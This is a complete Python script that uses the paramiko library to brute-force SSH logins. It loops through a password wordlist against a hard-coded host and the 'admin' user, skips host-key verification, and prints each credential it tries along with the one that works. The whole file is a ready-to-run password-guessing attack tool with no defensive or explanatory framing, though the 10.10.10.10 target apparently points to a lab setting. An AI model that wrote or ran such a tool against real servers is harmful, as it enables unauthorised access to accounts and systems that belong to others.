import paramiko

# attempt SSH login
def try_ssh_login(host, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # skip known_hosts check
    try:
        ssh.connect(hostname=host, port=port, username=username, password=password, timeout=5)
        ssh.close()
        return True # login successful
    except paramiko.AuthenticationException:
        return False # login failed
    except Exception as e:
        print(f" Connection error: {e}")
        return False


def main():
    host = "10.10.10.10"    # target IP address or domain
    port = 22               # SSH default port
    username = "admin"      # known username
    password_file = "password.txt"

    with open(password_file, "r") as f:
        for line in f:
            password = line.strip()
            success = try_ssh_login(host, port, username, password)
            if success:
                print(f" Success!: {username}:{password}")
                break
            else:
                print(f" Failed: {username}:{password}")

if __name__ == "__main__":
    main()
